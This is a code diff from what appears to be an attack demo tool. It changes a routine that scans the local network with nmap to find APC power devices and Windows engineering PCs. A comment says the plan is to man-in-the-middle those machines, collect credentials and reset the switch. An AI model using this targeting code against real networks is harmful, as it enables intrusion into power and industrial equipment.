@@ -189,23 +189,25 @@ def exploit_http(ip, username,password):
     if 'You are now logged off.' in response.text:
         prGreen('[+] Logged out.')
 
+
 #do the demo automatically by scanning the network, looking for potential APC devices and engineering PCs, then MITM them and search for creds, then reset the switch. this may never work. but if it does, it will be a neat little party trick that will impress lots of people. maybe even my dad.
 def automagic():
     #Scan for APC device
     nm = nmap.PortScanner()
-    interface_info = netifaces.ifaddresses('en0')
+    interface_info = netifaces.ifaddresses('en7')
     ip = interface_info[netifaces.AF_INET][0]['addr'] #Get current IP
     cidr = sum(bin(int(x)).count('1') for x in interface_info[netifaces.AF_INET][0]['netmask'].split('.'))
+
     target = ip +"/"+str(cidr)
     spinner.text="Scanning "+target+" for devices on the network..."
     spinner.start()
-    results = nm.scan(target,arguments='-sV')
+    results = nm.scan(target,arguments='-sV -Pn -p 1-1000')
     #prGreen("[+] OS: "+results['scan']['ip']['osmatch'][0]['name'])
     spinner.succeed()
     apc_devices=list()
     eng_pcs=list()
     for host in results['scan']:
-        prGreen("[+] Host: "+host)
+        prGreen("\n[+] Host: "+host)
         for port in results['scan'][host]['tcp']:
             service = results['scan'][host]['tcp'][port]['name']
             product = results['scan'][host]['tcp'][port]['product']
@@ -213,9 +215,9 @@ def automagic():
             prGreen("[+] Port: "+str(port))
             prGreen('[+] Service: '+service)
             prGreen('[+] Product: '+product)
-            if (port==23 or port==80) and (service=='telnet' or service=='http') and 'apc' in product:
+            if (port==23 or port==80) and (service=='telnet' or service=='http') and 'APC' in product:
                 apc_devices.append(host)
-            elif('windows' in service): #TODO add more coniditions here to narrow it down
+            elif('Microsoft' in service): #TODO add more coniditions here to narrow it down
                 eng_pcs.append(host)
 
     if (len(apc_devices)>0 and len(eng_pcs)>0):
